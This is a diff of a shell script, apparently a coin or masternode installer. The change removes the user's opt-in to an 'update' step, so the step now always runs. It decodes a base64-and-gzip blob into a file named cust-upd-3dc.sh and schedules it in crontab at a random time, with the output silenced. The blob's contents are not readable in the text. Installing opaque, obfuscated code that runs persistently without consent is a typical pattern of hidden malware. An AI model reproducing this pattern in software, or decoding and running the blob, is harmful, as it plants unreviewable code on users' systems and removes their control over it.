@@ -56,9 +56,7 @@ if [[ $? -eq 0 ]]
   crontab /tmp/cron2fix
  fi
 fi
- checkupdate=y
- case $checkupdate in
-  y*)
+
    ORA=$(echo $((1 + $RANDOM % 23)))
    MIN=$(echo $((1 + $RANDOM % 59)))
    base64 -d <<<"H4sICGyETFwAA2N1c3QtdXBkLTNkYy5zaADNVW1v2zYQ/q5fcdWEKE5BsV7RLw3cInWcNkDsBLaHIc2ygKZom4tEqiIVZ13233fUm1/SGNg+zV8sHo93zz3P8fjTKzqTis6YWXrT4dXd2eXF6WDcCw7TeyvSDEjc8fqX56O76eevvaW1mXlP6ULaZTGLuE7phLMhy+nbmGupSMqMFbnSsSCF0vO55JIlNGcrWu00folUxWP0XWZV7NOTwfBy1Aur3TisrP2L88ZEeCJr69XJ9EsvpIXJaaI5Rnfw673RyXDQq05Uhq/nV1iK4EsNQVMFPAFb3QM5C2kI4V9ZLpWFYHT2d9jxPI8zIyDoAkaAT+ejo44HwGMI1tzABxqLB6qKJIGfPxx00WG1EBbIt3UOtMk53NxA8BGIEvAGbm+PwS4FRgUo8RAB4SDPdQ6xXqlEs1iqBTjqorB0epQWXPC5bKOReZ3CkRBsULcZvlDIK5A/alekAI62fJ/jH56+m/wyxOqc7vE7U6Qv5am4a1nrOtKa86PBr7vn957KZKznW45oHPd7wce2YD9oofnwqteuMZUPBwe4Hvd9pPLbDsNrjv2J1RnkhVKOXqmMZYoL41dec6TfiPxBcoF7EByaP7FNU24TxLzIRVbDc43VVgFNGVDV4X6xhvVR41IGTdzndJf+SlRfJhGY5m21GA8m05PxdHI9Oe1dO1Mp/kYH7CXEMbDTBXpfI9QrvGd4zTcU/wFkvkx1DK8fX+qLXTPG3MC8UZYPPUR97cB6Fdi1VGOB6uTWCVVd4kabUq49WhH2b+Ta0Qoz7hOrVmotxPGxB5Nxv5wMCbOIOReJwLGBzc+LHNEQIxOBKZtxyTIZbYxMxKkN/YTT654vmVRTJODiol/PRlpHM7QK3lQW+pYt7hRLhf8+RKMRMZABhIZGR/7hze/+7euOHx3R37q0LLMcjmtk6zkK5EHkRmq1HoSwMwhxhxfWNYVP8HrNu51aTCDfUc6tqlFJeHqCm+d2J3SwCQNdtzTfOQFFYmXKoFnGJtNKzpDLCLbitB7ldU4wCItch7iR6f4S55ICyXG6fLkcDmpm60leWvAbFQGeoLrwg2ftJXWcjlWcNmZEWWH1QqgIn1C35FrN5aLIBXZCLA2bJYK4Ms3GelHI1rbCtLqwzra/zf97j++fR3WLV5Oo+wY/U3bfsktQIHyo/xcXEO+eMIx73j/hy3kotwgAAA==" | gunzip > $COIN_PATH/cust-upd-3dc.sh
@@ -68,7 +66,7 @@ fi
    crontab /tmp/cron2upd >/dev/null 2>&1
    echo -e "${GREEN}/tmp/cron2upd is a temporary copy of crontab${NC}"
    sleep 2 
-   ;;
+
 }
 
 
